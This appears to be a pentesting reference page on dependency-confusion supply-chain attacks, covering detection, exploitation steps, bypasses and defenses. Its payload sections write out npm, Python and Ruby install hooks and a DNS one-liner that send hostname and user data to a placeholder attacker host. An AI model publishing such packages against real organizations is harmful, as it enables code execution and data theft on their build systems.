# Dependency Confusion

> **Summary**: Dependency confusion (substitution attack) occurs when a package manager resolves a dependency name from a public registry instead of the intended private/internal registry, leading to installation of an attacker-controlled package with arbitrary code execution.
> **Impact**: Remote code execution on build servers, CI/CD pipelines, and developer machines during package installation.
> **Typical Severity**: Critical

## Detection

### Indicators
- Organization uses private/internal package registries alongside public registries (npm, PyPI, RubyGems, Maven, NuGet)
- Package manager configuration includes both internal and public registry URLs
- Lockfiles or manifests reference package names that do not exist on public registries
- Internal packages use organization-specific naming prefixes (e.g., `@company/*`, `company-*`)

### Automated Detection
- Audit package manifests for internal names not registered on public registries
- Compare `package.json`, `requirements.txt`, `pom.xml`, `*.csproj` against public registry availability
- Use tools like `confused` or `snync` to check for vulnerable packages

### Manual Detection
1. Extract package names from dependency manifests and lockfiles
2. Check if each name exists on the corresponding public registry
3. If an internal package name is available on a public registry, the project may be vulnerable
4. Check package manager configuration for registry priority and fallback behavior

## Exploitation

### Prerequisites
- Target organization uses private packages with names that are not registered on public registries
- Package manager is configured to check public registries (either as primary or fallback)
- Build/install process runs with network access to public registries

### Step-by-Step

1. **Discover internal package names**: Find names of private packages used by the target.

   **Sources for package name discovery:**
   ```bash
   # JavaScript: package.json, package-lock.json, yarn.lock
   # Look for scoped packages without public registry presence
   grep -oP '"@[^"]+"|"[a-z]+-[a-z]+"' package.json

   # Python: requirements.txt, setup.py, pyproject.toml, Pipfile
   grep -v '^#' requirements.txt | grep -oP '^[a-zA-Z0-9_-]+'

   # Ruby: Gemfile, Gemfile.lock
   grep -oP "gem '[^']+'" Gemfile

   # Java: pom.xml (groupId + artifactId)
   grep -oP '<artifactId>[^<]+' pom.xml

   # .NET: *.csproj, packages.config
   grep -oP 'Include="[^"]+' *.csproj
   ```

   **Other discovery vectors:**
   - Public GitHub repositories with exposed manifests
   - JavaScript source maps or bundled code containing import paths
   - Error messages revealing internal package names
   - Job postings or documentation mentioning internal tooling
   - CI/CD configuration files (`.github/workflows/`, `Jenkinsfile`, `.gitlab-ci.yml`)

   **Success**: List of internal package names that do not exist on public registries.

2. **Verify public registry availability**: Check if the package name is available for registration.
   ```bash
   # npm
   npm view <PACKAGE_NAME> 2>&1 | grep -i "not found\|404"

   # PyPI
   curl -s "https://pypi.org/pypi/<PACKAGE_NAME>/json" | head -1

   # RubyGems
   gem search -r <PACKAGE_NAME>

   # NuGet
   curl -s "https://api.nuget.org/v3-flatcontainer/<PACKAGE_NAME>/index.json"
   ```
   **Success**: Package name is not registered (404 response).

3. **Create malicious package**: Build a package with the same name and a higher version number.

   **npm example:**
   ```json
   {
     "name": "<INTERNAL_PACKAGE_NAME>",
     "version": "99.99.99",
     "scripts": {
       "preinstall": "curl https://<ATTACKER_CALLBACK>/?pkg=$(hostname)&user=$(whoami)"
     }
   }
   ```

   **Python example (setup.py):**
   ```python
   from setuptools import setup
   from setuptools.command.install import install
   import os

   class PostInstall(install):
       def run(self):
           os.system("curl https://<ATTACKER_CALLBACK>/?h=$(hostname)&u=$(whoami)")
           install.run(self)

   setup(
       name="<INTERNAL_PACKAGE_NAME>",
       version="99.99.99",
       cmdclass={"install": PostInstall},
   )
   ```

   **Success**: Malicious package created with install-time code execution.

4. **Publish to public registry**:
   ```bash
   # npm
   npm publish

   # PyPI
   twine upload dist/*

   # RubyGems
   gem push <PACKAGE_NAME>-99.99.99.gem
   ```
   **Success**: Package published and available on the public registry.

5. **Wait for execution**: When the target's CI/CD pipeline or developer runs `npm install`, `pip install`, etc., the package manager fetches the higher-versioned public package instead of the internal one.

   **Success**: Callback received from target infrastructure confirming code execution.

### Payloads

#### npm (preinstall hook)
```json
{
  "name": "<INTERNAL_PKG>",
  "version": "99.99.99",
  "scripts": {
    "preinstall": "curl https://<ATTACKER>/?h=$(hostname)&u=$(whoami)&d=$(pwd)"
  }
}
```

#### Python (setup.py install hook)
```python
import os, socket
from setuptools import setup
from setuptools.command.install import install

class Exfil(install):
    def run(self):
        os.system(f"nslookup $(whoami).$(hostname).<ATTACKER_DOMAIN>")
        install.run(self)

setup(name="<INTERNAL_PKG>", version="99.99.99", cmdclass={"install": Exfil})
```

#### Ruby (Gemfile extension)
```ruby
Gem::Specification.new do |s|
  s.name = "<INTERNAL_PKG>"
  s.version = "99.99.99"
  s.extensions = ["extconf.rb"]  # Runs during install
end
```

#### DNS-based exfiltration (stealthy)
```bash
# In any install hook:
nslookup "$(whoami).$(hostname).$(cat /proc/sys/kernel/hostname).<ATTACKER_DOMAIN>"
```

### Proof of Concept

```bash
# 1. Find internal package names from public repos
# Search for exposed package.json files on GitHub
# GitHub dork: "org:<TARGET_ORG>" filename:package.json

# 2. Check availability
npm view @<TARGET_ORG>/internal-utils 2>&1

# 3. Create and publish (authorized testing only)
mkdir dependency-confusion-poc && cd dependency-confusion-poc
npm init -y
# Edit package.json with target name and callback
npm publish --access public

# 4. Monitor for callbacks
# Use Burp Collaborator, interactsh, or custom DNS server
```

## Bypasses

- If `preinstall`/`postinstall` scripts are blocked by npm policy, use Python's `setup.py` which executes on `pip install` from source
- If the organization pins exact versions, publish a package with that exact version (may win if resolution order favors public)
- If scoped packages are used (`@org/pkg`), scopes are bound to organizations on npm -- this approach will not work for npm scopes, but may work for unscoped internal packages
- For Python, even if `--only-binary` is set, a `.tar.gz` sdist can execute `setup.py` on install
- Use DNS exfiltration if outbound HTTP is blocked from CI runners

## Escalation

- **CI/CD code execution to supply chain compromise**: Inject backdoors into build artifacts
- **Developer machine compromise to source code theft**: Access private repositories and credentials
- **Build server access to secrets theft**: Read environment variables containing API keys, tokens, and credentials
- **Lateral movement**: Use compromised CI/CD credentials to access production infrastructure

## Ecosystem-Specific Defenses and Secure Configurations

### npm / Yarn / pnpm
- Use scoped packages (`@company/*`) bound to private registry
- `.npmrc`: `@company:registry=https://registry.corp.example/npm/`
- Use `npm ci` with lockfile integrity checks

### Python (pip)
- Use `--index-url` (NOT `--extra-index-url`) pointing to internal proxy
- Use `pip install --require-hashes -r requirements.txt`
- Generate hashed requirements: `pip-compile --generate-hashes`

### .NET (NuGet)
- Use Package Source Mapping in `nuget.config`
- Map internal package patterns to internal feeds only

### Java (Maven/Gradle)
- Configure repository mirrors in `settings.xml`
- Use repository managers (Nexus, Artifactory) as single source of truth

## Tools

| Tool | Usage |
|------|-------|
| confused | `confused -l npm <PACKAGE_JSON>` -- Check npm packages for confusion |
| snync | Detect dependency confusion in npm projects |
| dep-confusion-checker | Automated checking across ecosystems |
| Interactsh | `interactsh-client` -- Out-of-band callback server for detecting execution |
| Burp Collaborator | Callback server for verifying code execution |

## References

- [Alex Birsan - Dependency Confusion (Original Research)](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)
- [Microsoft - 3 Ways to Mitigate Dependency Confusion](https://azure.microsoft.com/en-us/blog/3-ways-to-mitigate-risk-using-private-package-feeds/)
- [Snyk - Dependency Confusion Explained](https://snyk.io/blog/detect-prevent-dependency-confusion-attacks-npm-supply-chain-security/)

## Cross-References

- [JavaScript Analysis](../../recon/javascript-analysis.md) -- Discovering internal package names from JS bundles
- [Whitebox Pentesting](whitebox-pentesting.md) -- Reviewing dependency configurations in source code
